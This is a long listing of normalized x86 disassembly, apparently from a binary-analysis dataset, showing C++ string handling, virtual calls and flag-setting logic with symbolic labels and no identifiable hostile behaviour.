mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x9c ] 0x1
jmp r-xdata
mov [ ebx + 0x78 ] esi
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1c
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1d
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x15
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x16
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x9c ] 0x1000
jmp r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xb
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x9c ] 0x2
jmp r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xe
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xf
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x54 ]
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
cmp [ ebp - 0x18 ] esi
je r-xdata
mov eax [ ebx + 0x78 ]
cmp eax 0x4
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2c
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2d
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
neg al
sbb al al
push esi
inc al
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1e
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1f
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x3
mov [ ebx + 0x9c ] 0x100
jmp r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x17
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x18
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x9c ] 0x2000
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x3c ]
mov ecx [ eax + 0x14 ]
mov ecx [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ eax ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xc
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xd
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
movzx eax [ ebp - 0x11 ]
neg eax
sbb eax eax
and eax 0x8
mov [ ebx + 0x9c ] eax
mov [ ebx + 0x9c ] 0x4
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x3c ]
mov ecx [ eax + 0x14 ]
mov ecx [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ eax ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x10
mov eax [ ecx ]
push edx
call [ eax + 0x40 ]
push 0xffffffff
push esi
push eax
lea ecx [ ebx + 0x280 ]
mov [ ebp - 0x4 ] 0x11
call sub_40400a
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x3c ]
mov ecx [ eax + 0x14 ]
mov ecx [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ eax ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
cmp eax 0x3
jne r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2e
call sub_403dc1
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2f
call sub_41fddc
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa0 ] 0x1
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x20
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x21
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x3
mov [ ebx + 0x9c ] 0x200
jmp r-xdata
cmp [ ebx + 0x78 ] 0x4
jne r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x19
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1a
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
xor eax eax
cmp [ ebp - 0x11 ] al
sete al
dec eax
and eax 0xffff4000
add eax 0x10000
mov [ ebx + 0x9c ] eax
mov [ ebx + 0x9c ] 0x8000
jmp r-xdata
call sub_423d5c
cmp [ ebp - 0x24 ] eax
je r-xdata
call sub_423d5c
cmp [ ebp - 0x24 ] eax
je r-xdata
call sub_423d5c
cmp [ ebp - 0x24 ] eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
lea ecx [ ebp - 0x40 ]
push ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x3d
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x40 ]
push 0xffffffff
push esi
push eax
lea ecx [ ebx + 0x2d4 ]
mov [ ebp - 0x4 ] 0x3e
call sub_40400a
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x3f
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x1c ] 0x1
call sub_403dc1
lea ecx [ ebp - 0xc4 ]
push ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x40
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ ebp - 0x1c ] 0x3
call [ eax + 0x44 ]
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x30
call sub_403dc1
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x31
call sub_41fddc
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa0 ] 0x2
jmp r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x22
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x23
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x3
mov [ ebx + 0x9c ] 0x400
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x7c ]
cmp [ ebp - 0x20 ] eax
je r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
call sub_41ea73
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x7c ]
cmp [ ebp - 0x20 ] eax
je r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x7c ]
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x11 ] 0x0
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x41
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x1c ] 0x7
call sub_403dc1
mov [ ebp - 0x4 ] 0x42
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x1c ] 0xf
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x43
mov eax [ ebx ]
push ecx
mov ecx ebx
mov [ ebp - 0x1c ] 0x1f
call [ eax + 0x50 ]
mov [ ebp - 0x11 ] 0x1
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x32
call sub_403dc1
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x33
call sub_41fddc
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa0 ] 0x3
jmp r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x38
call sub_403dc1
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x39
call sub_403dc1
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3a
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x50 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x24
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x25
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x3
mov [ ebx + 0x9c ] 0x800
jmp r-xdata
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
lea esi [ ebp - 0x24 ]
test al al
je r-xdata
call sub_40f2a9
lea ecx [ ebx + 0xd0 ]
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_408d54
xor esi esi
jmp r-xdata
mov esi [ ebx + 0x94 ]
lea eax [ ebp - 0x1c ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ ebx + 0x98 ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jb r-xdata
call sub_40f2a9
mov ecx [ eax ]
call sub_41ea73
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_40f2a9
lea ecx [ ebx + 0x110 ]
push ecx
mov ecx [ eax ]
call sub_41e7ed
pop ecx
jmp r-xdata
test [ ebp - 0x1c ] 0x8
je r-xdata
and [ ebp - 0x1c ] 0xffffffef
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
test [ ebp - 0x1c ] 0x10
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x34
call sub_403dc1
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x35
call sub_41fddc
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa0 ] 0x4
jmp r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3b
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x2c ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x26
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x27
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x4
mov [ ebx + 0x9c ] 0x10
jmp r-xdata
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
lea esi [ ebp - 0x24 ]
test al al
je r-xdata
call sub_40f2a9
lea ecx [ ebx + 0xf0 ]
push ecx
mov ecx [ eax ]
call sub_41e7ed
pop ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x7c ] ecx
cmp [ ebp - 0x24 ] esi
je r-xdata
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x12
inc ecx
mov [ ebx + 0x98 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
lea esi [ ebp - 0x24 ]
call sub_408d54
xor esi esi
jmp r-xdata
mov esi [ ebx + 0x94 ]
lea eax [ ebp - 0x1c ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
lea ecx [ ebx + 0x98 ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx ]
mov edx 0x3fffffff
sub edx eax
cmp edx 0x1
jb r-xdata
test [ ebp - 0x1c ] 0x4
je r-xdata
and [ ebp - 0x1c ] 0xfffffff7
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x36
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x37
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa0 ] 0x5
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x28
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x29
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x4
mov [ ebx + 0x9c ] 0x40
jmp r-xdata
call sub_40f2a9
mov ecx [ eax ]
call sub_41ea73
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x2c ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebx + 0x2b8 ]
call sub_40400a
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_408d54
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x7c ] ecx
cmp [ ebp - 0x24 ] esi
je r-xdata
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x3c
jmp r-xdata
inc eax
mov [ ecx ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
test [ ebp - 0x1c ] 0x2
je r-xdata
and [ ebp - 0x1c ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_40415f
mov [ ebx + 0xa0 ] 0x6
push eax
call sub_423a43
or [ ebp - 0x4 ] 0xffffffff
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebx + 0x2f0 ] eax
call sub_40415f
push r--data
lea ecx [ ebp - 0x5c ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2a
call sub_403dc1
lea ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2b
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x44 ]
neg al
sbb al al
push esi
inc al
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
mov [ ebx + 0x78 ] 0x4
je r-xdata
mov [ ebx + 0x78 ] 0x4
mov [ ebx + 0x9c ] 0x80
jmp r-xdata
mov esi [ ebx + 0x94 ]
lea eax [ ebp - 0x1c ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
lea ecx [ ebx + 0x98 ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx ]
mov edx 0x3fffffff
sub edx eax
cmp edx 0x1
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x7c ] ecx
cmp [ ebp - 0x24 ] esi
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_401065
push r--data
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0xa8 ] r--data
call sub_42597b
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x1c ] 0x1
je r-xdata
and [ ebp - 0x1c ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_40415f
mov [ ebx + 0x9c ] esi
mov [ ebx + 0x9c ] 0x20
jmp r-xdata
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1b
jmp r-xdata
inc eax
mov [ ecx ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
cmp [ ebp - 0x11 ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0xfffffffe
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_40415f
call sub_425e4c
retn
push r--data
lea ecx [ ebp - 0xc4 ]
call sub_403dc1
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x44
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x18 ] eax
call sub_40415f
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x45
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x46
mov eax [ ecx ]
push edx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x47
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x48
mov eax [ ecx ]
push edx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa8 ] 0x1
jmp r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x49
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4a
mov eax [ ecx ]
push edx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa8 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
call [ eax + 0x3c ]
mov ecx eax
mov eax [ ecx + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ecx ]
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] esi
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4b
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4c
mov eax [ ecx ]
push edx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
